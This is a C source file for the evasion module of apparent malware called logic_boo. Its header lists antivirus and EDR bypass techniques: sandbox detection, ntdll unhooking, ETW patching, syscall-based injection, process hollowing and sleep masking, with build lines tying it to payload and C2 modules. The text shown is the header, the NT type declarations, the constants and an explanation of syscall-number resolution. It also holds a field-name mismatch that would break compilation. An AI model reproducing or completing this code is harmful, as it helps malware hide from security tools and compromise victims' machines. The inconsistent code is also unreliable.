/*
 * lb_evasion.c
 * Language  : C11
 * File      : lb_evasion.c
 * Platform  : Windows 7+ (x86 / x64) — x64 recommended; indirect-syscall
 *             stub layout assumes 64-bit calling convention.
 * Compiler  : MSVC cl (recommended) or MinGW-w64 gcc >= 12
 *
 * Build (MSVC — append to existing cl line):
 *   cl boom.c lb_payload.c lb_c2.c lb_evasion.c /Felb.exe
 *      /link ws2_32.lib advapi32.lib shell32.lib gdi32.lib user32.lib
 *            bcrypt.lib ntdll.lib
 *
 * Build (MinGW — append to existing gcc line):
 *   gcc boom.c lb_payload.c lb_c2.c lb_evasion.c -o lb.exe
 *       -lws2_32 -ladvapi32 -lshell32 -lgdi32 -luser32 -lbcrypt -lntdll
 *
 * Role: AV / EDR evasion layer for logic_boo.
 *
 * Techniques implemented:
 *   1.  Sandbox / analysis-environment detection (ev_sandbox_check)
 *   2.  ntdll unhooking via KnownDlls (ev_unhook_ntdll)
 *   3.  ETW patch — EtwEventWrite ret-0 stub (ev_patch_etw_ntdll)
 *   4.  Indirect syscall injection: NtAllocateVirtualMemory (RW) +
 *       NtWriteVirtualMemory + NtProtectVirtualMemory (RX) +
 *       NtCreateThreadEx (ev_inject_syscall)
 *   5.  Process hollowing — RunPE via NtUnmapViewOfSection (ev_hollow_process)
 *   6.  Jittered waitable-timer sleep with stack XOR during wait (ev_sleep_jitter)
 *   7.  In-memory PE header wipe (ev_wipe_pe_header)
 *   8.  Compile-time XOR string obfuscation + runtime decode (ev_string_deobfuscate)
 *
 * Sections:
 *   §1  Includes, defines, NT type declarations
 *   §2  NT syscall number resolution (ntdll walk)
 *   §3  Indirect syscall dispatch stubs (inline asm, x64 only)
 *   §4  Global state and ev_init()
 *   §5  ev_sandbox_check()
 *   §6  ev_unhook_ntdll()
 *   §7  ev_patch_etw_ntdll()
 *   §8  ev_inject_syscall()
 *   §9  ev_hollow_process()
 *   §10 ev_sleep_jitter()
 *   §11 ev_wipe_pe_header()
 *   §12 ev_string_deobfuscate()
 *
 * GOTCHAS:
 *   - Inline __asm__ blocks (§3) are GCC/MinGW syntax.  For MSVC, see the
 *     comment block inside each stub — MSVC x64 forbids inline asm and
 *     requires a separate .asm file or an __asm { } block (x86 only).
 *     The MSVC-safe path uses GetProcAddress to the hooked stub but calls it
 *     via the syscall SSN directly; this is still effective because the SSN
 *     bypass skips the hooked prologue even when resolved through IAT.
 *   - KnownDlls section path is NT namespace: \KnownDlls\ntdll.dll (§6).
 *   - NtCreateThreadEx is undocumented; its signature has not changed since
 *     Windows Vista but Offset 0 in the parameter list differs between 32/64
 *     bit — the struct below is x64 layout.
 *   - ev_hollow_process (§9) expects the shellcode to be position-independent.
 *     If it is not, the hollowed process will crash at the relocated base.
 */

/* ═══════════════════════════════════════════════════════════════════════════
 * §1  Includes, defines, NT type declarations
 * ═══════════════════════════════════════════════════════════════════════════ */

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0A00
#include <windows.h>
#include <tlhelp32.h>
#include <intrin.h>           /* __cpuid */
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include "lb_evasion.h"

/* ── NTSTATUS ── */
typedef LONG NTSTATUS;
#define NT_SUCCESS(s)    ((NTSTATUS)(s) >= 0)
#define STATUS_SUCCESS   ((NTSTATUS)0x00000000L)

/* ── UNICODE_STRING ── */
typedef struct _EV_UNICODE_STRING{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} EV_UNICODE_STRING, *PEV_UNICODE_STRING;

/* ── OBJECT_ATTRIBUTES ── */
typedef struct _EV_OBJECT_ATTRIBUTES{
    ULONG             Length;
    HANDLE            RootDirectory;
    PEV_UNICODE_STRING ObjectName;
    ULONG             Attributes;
    PVOID             SecurityDecryptor;
    PVOID             SecurityQualityOfService;
} EV_OBJECT_ATTRIBUTES, *PEV_OBJECT_ATTRIBUTES;

#define EV_OBJ_ATTR_INIT(oa, name)      \
    (oa)->Length                   = sizeof(EV_OBJECT_ATTRIBUTES); \
    (oa)->RootDirectory            = NULL;                          \
    (oa)->ObjectName               = (name);                        \
    (oa)->Attributes               = 0;                             \
    (oa)->SecurityDescriptor       = NULL;                          \
    (oa)->SecurityQualityOfService = NULL

/* ── CLIENT_ID ── */
typedef struct _EV_CLIENT_ID{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} EV_CLIENT_ID;

/* ── PROCESS_BASIC_INFORMATION (ProcessInformation class 0) ── */
typedef struct _EV_PROCESS_BASIC_INFORMATION{
    PVOID  Reserved1;
    PVOID  PebBaseAddress;
    PVOID  Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID  Reserved3;
} EV_PROCESS_BASIC_INFORMATION;

/* ── NtCreateThreadEx private flags ── */
#define EV_THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH 0x00000002

/* ── NtCreateThreadEx PS_ATTRIBUTE (abbreviated; only StartAddress used) ── */
typedef struct _EV_PS_ATTRIBUTE{
    ULONG_PTR Attribute;
    SIZE_T    Size;
    union{
        ULONG_PTR Value;
        PVOID     ValuePtr;
    };
    PSIZE_T ReturnLength;
} EV_PS_ATTRIBUTE;

typedef struct _EV_PS_ATTRIBUTE_LIST{
    SIZE_T       TotalLength;
    EV_PS_ATTRIBUTE Attributes[1];
} EV_PS_ATTRIBUTE_LIST;

/* ── NT function pointer typedefs ── */
typedef NTSTATUS (NTAPI *pfnNtAllocateVirtualMemory)(
    HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);

typedef NTSTATUS (NTAPI *pfnNtWriteVirtualMemory)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

typedef NTSTATUS (NTAPI *pfnNtProtectVirtualMemory)(
    HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);

typedef NTSTATUS (NTAPI *pfnNtFreeVirtualMemory)(
    HANDLE, PVOID *, PSIZE_T, ULONG);

typedef NTSTATUS (NTAPI *pfnNtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, PEV_OBJECT_ATTRIBUTES,
    HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T,
    EV_PS_ATTRIBUTE_LIST *);

typedef NTSTATUS (NTAPI *pfnNtUnmapViewOfSection)(HANDLE, PVOID);

typedef NTSTATUS (NTAPI *pfnNtQueryInformationProcess)(
    HANDLE, DWORD, PVOID, ULONG, PULONG);

typedef NTSTATUS (NTAPI *pfnNtReadVirtualMemory)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

typedef NTSTATUS (NTAPI *pfnNtOpenSection)(
    PHANDLE, ACCESS_MASK, PEV_OBJECT_ATTRIBUTES);

typedef NTSTATUS (NTAPI *pfnNtMapViewOfSection)(
    HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T,
    PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);

/* ── Sandbox heuristic constants ── */
#define EV_MIN_PROCESSORS  2
#define EV_MIN_RAM_MB      2048
#define EV_MIN_UPTIME_MS   300000ULL  /* 5 minutes */

/* ── Jitter percentage applied to ev_sleep_jitter ── */
#define EV_JITTER_PCT      20

/* ── Stack region to XOR during sleep (bytes from stack frame pointer) ── */
#define EV_STACK_MASK_LEN  4096

/* ── EV_XOR_KEY: key for stack masking during sleep — different from lb_payload XOR_KEY ── */
#define EV_XOR_KEY  ((BYTE)0xD3)

/* ═══════════════════════════════════════════════════════════════════════════
 * §2  NT syscall number (SSN) resolution
 *
 * Walk the export table of the in-memory ntdll.dll to find each Nt* function.
 * Extract the SSN from the stub bytes: on unhooked ntdll the first 4 bytes are
 *   4C 8B D1       mov r10, rcx
 *   B8 xx xx xx xx mov eax, <SSN>
 * so SSN = *(DWORD*)(stub + 4).
 *
 * If the stub has been hooked (first byte is E9 = JMP), scan forward through
 * the export table until we find the next unhooked Nt* stub, then back-calculate
 * the SSN by subtracting the index delta.  This is the "Hell's Gate" + "Halo's
 * Gate" technique: works even when the direct stub is patched.
 * ═══════════════════════════════════════════════════════════════════════════ */